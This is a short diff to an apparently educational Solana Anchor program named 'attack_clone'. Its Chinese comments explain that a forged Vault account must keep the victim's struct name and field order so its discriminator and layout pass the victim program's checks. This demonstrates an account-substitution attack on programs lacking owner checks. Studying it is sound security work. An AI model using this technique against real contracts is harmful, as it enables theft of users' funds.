@@ -13,8 +13,8 @@ pub mod attack_clone {
     // }
 
     pub fn initialize_vault(ctx: Context<InitializeVault>) -> Result<()> {
-        ctx.accounts.vault.token_account = ctx.accounts.token_account.key();
-        ctx.accounts.vault.authority = ctx.accounts.authority.key();
+        ctx.accounts.vault.token_accountxx = ctx.accounts.token_account.key();
+        ctx.accounts.vault.authorityx = ctx.accounts.authority.key();
         Ok(())
     }
 }
@@ -34,6 +34,11 @@ pub struct InitializeVault<'info> {
 
 #[account]
 pub struct Vault {
-    token_account: Pubkey,
-    authority: Pubkey,
+    // 必须保持和被攻击者的账户结构体同名, 即必须Vault， 因为结构体名称的hash作为账户的 Discriminator,
+    // 否则被攻击合约序列化的时候报错: Error Message: 8 byte discriminator did not match what was expected
+
+    // 必须保持和被攻击账户的数据结构顺序一致,
+    // 结构体内部变量名称可以不同,
+    token_accountxx: Pubkey,
+    authorityx: Pubkey,
 }
